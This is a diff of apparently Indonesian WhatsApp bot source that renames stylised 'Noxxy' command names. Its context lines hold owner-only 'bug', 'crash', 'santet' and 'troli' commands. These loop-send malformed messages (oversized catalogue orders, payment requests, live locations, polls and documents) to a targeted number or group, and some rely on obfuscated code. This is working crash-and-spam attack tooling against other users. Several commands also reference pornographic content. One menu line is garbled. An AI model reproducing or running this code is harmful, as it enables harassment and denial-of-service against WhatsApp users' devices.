@@ -308,7 +308,7 @@ user.afkReason = ''
 //=================================================//
 switch(command) {
 //=================================================//
-case 'inibug': case '𝑵𝒐𝒙𝒙𝒚jhon': {
+case 'inibug': case 'noxxyjhon': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -324,7 +324,7 @@ haikal.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }
 }
 break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚poll': case '𝑵𝒐𝒙𝒙𝒚jhon2': {
+case 'noxxypoll': case 'noxxyjhon2': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -333,7 +333,7 @@ ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
 var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "pollCreationMessage": {
-"name": "HALO 👋 SAYA BOT ☆𝑵𝒐𝒙𝒙𝒚⏧☆⏧",
+"name": "HALO 👋 SAYA BOT ☆noxxy⏧☆⏧",
 "options": [
 {
 "optionName": "KATANYA WA KEBAL"
@@ -348,7 +348,7 @@ var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 "optionName": "KATANYA KEBAL"
 },
 {
-"optionName": "SALAM BROTHER BY ☆𝑵𝒐𝒙𝒙𝒚⏧☆⏧"
+"optionName": "SALAM BROTHER BY ☆noxxy⏧☆⏧"
 }
 ],
 "selectableOptionsCount": 5
@@ -359,7 +359,7 @@ deploy('sukses sendbug')}
 }
 break
 //=================================================//
-case 'jadikatalog': case '𝑵𝒐𝒙𝒙𝒚katalog': {
+case 'jadikatalog': case 'noxxykatalog': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!quoted) throw 'Reply Image/sticker'
@@ -372,7 +372,7 @@ function _0x348d(_0x50ce67,_0x2397a1){var _0x15bb19=_0x15bb();return _0x348d=fun
 }
 break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚troli2': case '𝑵𝒐𝒙𝒙𝒚trol': {
+case 'noxxytroli2': case 'noxxytrol': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return reply(`Jumlahnya?`)
@@ -387,7 +387,7 @@ var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "itemCount": 1999,
 "status": "INQUIRY",
 "surface": "CATALOG",
-"message": " BY ☆𝑵𝒐𝒙𝒙𝒚⏧☆⏧ ",
+"message": " BY ☆noxxy⏧☆⏧ ",
 "orderTitle": " BUG TROLI ", // 
 "sellerJid": "6281214281312@s.whatsapp.net",
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
@@ -397,7 +397,7 @@ haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
 }
 }
 break
-case '𝑵𝒐𝒙𝒙𝒚troli3': case '𝑵𝒐𝒙𝒙𝒚trol2': {
+case 'noxxytroli3': case 'noxxytrol2': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return reply(`Jumlahnya?`)
@@ -408,7 +408,7 @@ function _0x4279(){const _0x4c3178=['fromObject','Message','1847261837216262824'
 }
 break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚santet': {
+case 'noxxysantet': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n`)
@@ -422,7 +422,7 @@ var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.from
 "currencyCodeIso4217": "IDR",
 "amount1000": "100",
 "extendedTextMessage": {
-"text": `MY DEVELOPER ☆𝑵𝒐𝒙𝒙𝒚⏧☆⏧`,
+"text": `MY DEVELOPER ☆noxxy⏧☆⏧`,
 }
 }}), { userJid: m.chat, quoted: doc})
 haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -431,7 +431,7 @@ m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
 }
 break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚santetgc': {
+case 'noxxysantetgc': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
@@ -454,7 +454,7 @@ m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
 }
 break
 //=================================================//
-case 'ducu': case '𝑵𝒐𝒙𝒙𝒚ducu': {
+case 'ducu': case 'noxxyducu': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -467,7 +467,7 @@ haikal.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', 
 }
 break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚daca': case '𝑵𝒐𝒙𝒙𝒚daca':  {
+case 'noxxydaca': case 'noxxydaca':  {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -480,7 +480,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚docu': case '𝑵𝒐𝒙𝒙𝒚draknes':  {
+case 'noxxydocu': case 'noxxydraknes':  {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -506,7 +506,7 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 }
 break
 //=================================================//
-case 'duc': case '𝑵𝒐𝒙𝒙𝒚slebew':  {
+case 'duc': case 'noxxyslebew':  {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -532,7 +532,7 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 }
 break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚virtext1': case '𝑵𝒐𝒙𝒙𝒚su': {
+case 'noxxyvirtext1': case 'noxxysu': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
@@ -542,7 +542,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 }
 break
-case '𝑵𝒐𝒙𝒙𝒚virtext2': case '𝑵𝒐𝒙𝒙𝒚tol': {
+case 'noxxyvirtext2': case 'noxxytol': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
@@ -552,7 +552,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 }
 break
-case '𝑵𝒐𝒙𝒙𝒚virtext3': case '𝑵𝒐𝒙𝒙𝒚memek':  {
+case 'noxxyvirtext3': case 'noxxymemek':  {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
@@ -562,7 +562,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 }
 break
-case '𝑵𝒐𝒙𝒙𝒚virtext4': case '𝑵𝒐𝒙𝒙𝒚contol': {
+case 'noxxyvirtext4': case 'noxxycontol': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
@@ -572,7 +572,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 }
 break
-case '𝑵𝒐𝒙𝒙𝒚virtext5': case '𝑵𝒐𝒙𝒙𝒚textv': {
+case 'noxxyvirtext5': case 'noxxytextv': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
@@ -582,7 +582,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 }
 break
-case '𝑵𝒐𝒙𝒙𝒚virtext6': case '𝑵𝒐𝒙𝒙𝒚gas': {
+case 'noxxyvirtext6': case 'noxxygas': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
@@ -592,7 +592,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 }
 break
-case '𝑵𝒐𝒙𝒙𝒚virtext7': case '𝑵𝒐𝒙𝒙𝒚juvirtext': {
+case 'noxxyvirtext7': case 'noxxyjuvirtext': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
@@ -602,7 +602,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 }
 break
-case '𝑵𝒐𝒙𝒙𝒚virtext8': case '𝑵𝒐𝒙𝒙𝒚juvirtext1':{
+case 'noxxyvirtext8': case 'noxxyjuvirtext1':{
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
@@ -612,7 +612,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 }
 break
-case '𝑵𝒐𝒙𝒙𝒚virtext9': case '𝑵𝒐𝒙𝒙𝒚juvirtext2':{
+case 'noxxyvirtext9': case 'noxxyjuvirtext2':{
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
@@ -622,7 +622,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 }
 break
-case '𝑵𝒐𝒙𝒙𝒚virtext10': case '𝑵𝒐𝒙𝒙𝒚juvirtext3': {
+case 'noxxyvirtext10': case 'noxxyjuvirtext3': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
@@ -633,7 +633,7 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚bug1': case '𝑵𝒐𝒙𝒙𝒚crash': {
+case 'noxxybug1': case 'noxxycrash': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -659,7 +659,7 @@ haikal.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
 }
 break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚bug2': case '𝑵𝒐𝒙𝒙𝒚crash1': {
+case 'noxxybug2': case 'noxxycrash1': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -688,7 +688,7 @@ haikal.relayMessage(m.chat, image.message, { messageId: image.key.id })
 }
 break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚bug3': case '𝑵𝒐𝒙𝒙𝒚crash2': {
+case 'noxxybug3': case 'noxxycrash2': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -715,7 +715,7 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 }
 break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚bug4': case '𝑵𝒐𝒙𝒙𝒚crash3': {
+case 'noxxybug4': case 'noxxycrash3': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -736,7 +736,7 @@ haikal.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
 }
 break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚bug5': case '𝑵𝒐𝒙𝒙𝒚crash4': {
+case 'noxxybug5': case 'noxxycrash4': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -760,7 +760,7 @@ haikal.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
 }
 }
 break
-case '𝑵𝒐𝒙𝒙𝒚bug6': case '𝑵𝒐𝒙𝒙𝒚crash5': {
+case 'noxxybug6': case 'noxxycrash5': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -785,7 +785,7 @@ haikal.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
 }
 break
 
-case '𝑵𝒐𝒙𝒙𝒚delay': {
+case 'noxxydelay': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -797,7 +797,7 @@ var _0x39080c=_0x4b8f;function _0x3b16(){var _0x4c72fa=['chat','9940068BVkoHm','
 }
 break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚bug7': case '𝑵𝒐𝒙𝒙𝒚crash6': {
+case 'noxxybug7': case 'noxxycrash6': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -820,7 +820,7 @@ haikal.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
 }
 break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚bug8': case '𝑵𝒐𝒙𝒙𝒚crash7': {
+case 'noxxybug8': case 'noxxycrash7': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -838,7 +838,7 @@ haikal.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
 }
 break
 //=================================================//
-case 'lokas': case '𝑵𝒐𝒙𝒙𝒚lokas': {
+case 'lokas': case 'noxxylokas': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -850,7 +850,7 @@ var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 "liveLocationMessage": {
 "degreesLatitude": -6.9367014,
 "degreesLongitude": 107.7228574,
-"caption": `© ☆𝑵𝒐𝒙𝒙𝒚⏧☆⏧${ngazap(prefix)}`,
+"caption": `© ☆noxxy⏧☆⏧${ngazap(prefix)}`,
 "sequenceNumber": "1657237469254001",
 "jpegThumbnail": messa.imageMessage,
 }
@@ -860,7 +860,7 @@ haikal.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.
 }
 break
 //=================================================//
-case 'buglokas': case '𝑵𝒐𝒙𝒙𝒚lokas2': {
+case 'buglokas': case 'noxxylokas2': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -904,7 +904,7 @@ haikal.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id
 }
 break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚troli': {
+case 'noxxytroli': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -997,7 +997,7 @@ m.reply(tekteka)
 }
 break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚jagoan' : {
+case 'noxxyjagoan' : {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1016,7 +1016,7 @@ thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg',
 break
 //=================================================//
 /*BUG WACAP */
-case '𝑵𝒐𝒙𝒙𝒚skuy' : {
+case 'noxxyskuy' : {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
@@ -1041,7 +1041,7 @@ await sleep(20)
 break
 //=================================================//
 /*BUG WACAP */
-case 'gas𝑵𝒐𝒙𝒙𝒚' : {
+case 'gasnoxxy' : {
 if (isBan) throw sticBanLu(from)
 if (!isCreator) return
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
@@ -1102,7 +1102,7 @@ m.reply(`${m.pushName} Hello Saya Bot Hw Mods${text ? ': ' + text : ''}`)
 }
 break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚stik': case '𝑵𝒐𝒙𝒙𝒚kangbug': case 'buttonkatian': {
+case 'noxxystik': case 'noxxykangbug': case 'buttonkatian': {
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1145,7 +1145,7 @@ m.reply(mess.wait)
 haikal.sendMessage(m.chat, { video: krt, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `${bugsw}` }, { quoted:m })
 break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚bugie': case '𝑵𝒐𝒙𝒙𝒚kangbug1': {
+case 'noxxybugie': case 'noxxykangbug1': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1232,7 +1232,7 @@ m.reply('*Success Broadcast*')
 }
 break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚button': case '𝑵𝒐𝒙𝒙𝒚kangbuttton': 
+case 'noxxybutton': case 'noxxykangbuttton': 
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1254,7 +1254,7 @@ haikal.sendMessage(m.chat, buttonMessage)
 }
  break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚tag': case '𝑵𝒐𝒙𝒙𝒚bar':  {
+case 'noxxytag': case 'noxxybar':  {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!m.isGroup) throw groupon(from)
@@ -1262,7 +1262,7 @@ haikal.sendMessage(m.chat, { text : `${buttonkal}` , mentions: participants.map(
 }
 break
 //=================================================//
-case 'hiya': case '𝑵𝒐𝒙𝒙𝒚oke': {
+case 'hiya': case 'noxxyoke': {
 if (isBan) throw sticBanLu(from)
 if (!isCreator) return
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1275,7 +1275,7 @@ haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-strea
 }
 break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚tod': case '𝑵𝒐𝒙𝒙𝒚ewe': {
+case 'noxxytod': case 'noxxyewe': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1288,7 +1288,7 @@ haikal.sendContact(m.chat, global.ownerr, fkontaak)
 }
 break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚bokep': case '𝑵𝒐𝒙𝒙𝒚ngentod': {
+case 'noxxybokep': case 'noxxyngentod': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1301,7 +1301,7 @@ haikal.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${co
 }
 break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚sange': {
+case 'noxxysange': {
 if (isBan) throw sticBanLu(from)
 if (!m.isGroup) return m.reply(mess.group)
 if (!isBotAdmins) return m.reply(mess.botAdmin)
@@ -1436,7 +1436,7 @@ haikal.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: doc })
 }
 break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚hu': case '𝑵𝒐𝒙𝒙𝒚1': {
+case 'noxxyhu': case 'noxxy1': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1449,7 +1449,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚hi': case '𝑵𝒐𝒙𝒙𝒚2': {
+case 'noxxyhi': case 'noxxy2': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1462,7 +1462,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚ha': case '𝑵𝒐𝒙𝒙𝒚3': {
+case 'noxxyha': case 'noxxy3': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1475,7 +1475,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚he': case '𝑵𝒐𝒙𝒙𝒚4': {
+case 'noxxyhe': case 'noxxy4': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1488,7 +1488,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚ba': case '𝑵𝒐𝒙𝒙𝒚5': {
+case 'noxxyba': case 'noxxy5': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1501,7 +1501,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚be': case '𝑵𝒐𝒙𝒙𝒚6': {
+case 'noxxybe': case 'noxxy6': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1514,7 +1514,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚bu': case '𝑵𝒐𝒙𝒙𝒚7': {
+case 'noxxybu': case 'noxxy7': {
 if (isBan) throw sticBanLu(from)
 if (!isCreator) return
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1527,7 +1527,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚bi': case '𝑵𝒐𝒙𝒙𝒚8': {
+case 'noxxybi': case 'noxxy8': {
 if (isBan) throw sticBanLu(from)
 if (!isCreator) return
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1540,7 +1540,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚ca': case '𝑵𝒐𝒙𝒙𝒚9': {
+case 'noxxyca': case 'noxxy9': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1553,7 +1553,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚ci': case '𝑵𝒐𝒙𝒙𝒚10': {
+case 'noxxyci': case 'noxxy10': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1566,7 +1566,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚cu': case '𝑵𝒐𝒙𝒙𝒚11': {
+case 'noxxycu': case 'noxxy11': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -1579,7 +1579,7 @@ for (let i = 0; i < jumlah; i++) {
  }
  break
 //=================================================//
-case '𝑵𝒐𝒙𝒙𝒚co': case '𝑵𝒐𝒙𝒙𝒚12': {
+case 'noxxyco': case 'noxxy12': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -4926,7 +4926,7 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ╠➤𝑵𝒐𝒙𝒙𝒚sound79
 ╠➤𝑵𝒐𝒙𝒙𝒚sound80
 ╠➤𝑵𝒐𝒙𝒙𝒚sound81
-╠➤𝑵𝒐𝒙𝒙𝒚sound82
+╠➤??𝒐𝒙𝒙𝒚sound82
 ╠➤𝑵𝒐𝒙𝒙𝒚sound83
 ╠➤𝑵𝒐𝒙𝒙𝒚sound84
 ╠➤𝑵𝒐𝒙𝒙𝒚sound85
